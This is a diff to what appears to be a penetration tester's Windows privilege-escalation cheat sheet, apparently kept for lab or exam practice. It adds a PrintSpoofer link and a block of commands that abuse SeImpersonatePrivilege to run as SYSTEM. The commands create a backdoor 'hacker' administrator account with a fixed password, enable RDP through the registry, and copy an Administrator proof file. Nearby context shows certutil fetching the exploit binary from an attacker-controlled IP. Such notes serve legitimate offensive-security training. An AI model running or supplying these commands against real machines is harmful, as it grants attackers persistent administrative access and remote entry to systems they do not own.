@@ -627,6 +627,7 @@ Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description
 ```
 
 # SeImpersonatePrivilege (Check out Potato Family & Printspoofer at:)
+https://github.com/itm4n/PrintSpoofer
 https://jlajara.gitlab.io/Potatoes_Windows_Privesc
 ```bash
 # SigmaPotato (Allows you to execute commands in the context of NT AUTHORITY\SYSTEM. )
@@ -669,6 +670,18 @@ certutil -urlcache -f http://192.168.45.244/PrintSpoofer.exe C:\Users\Public\Doc
 .\PrintSpoofer.exe -i -c powershell.exe
 
 # NT AUTH/System Achieved
+
+# Alternate Commands if the above failed 
+# Create User (Skip to next step if not nessessary)
+.\PrintSpoofer64.exe -i -c "cmd /c net user hacker Password123! /add"
+# Add to administrators group (Add current user OR new user)
+.\PrintSpoofer64.exe -i -c "cmd /c net localgroup administrators hacker /add"
+# Enable RDP (Optional)
+.\PrintSpoofer64.exe -i -c "cmd /c reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server"" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
+# Grab proof.txt (Abuse privs)
+.\PrintSpoofer64.exe -i -c "cmd /c type C:\Users\Administrator\Desktop\proof.txt > C:\Users\eric.wallows\Documents\proof.txt"
+
+
 ```
 
 # WriteDacl
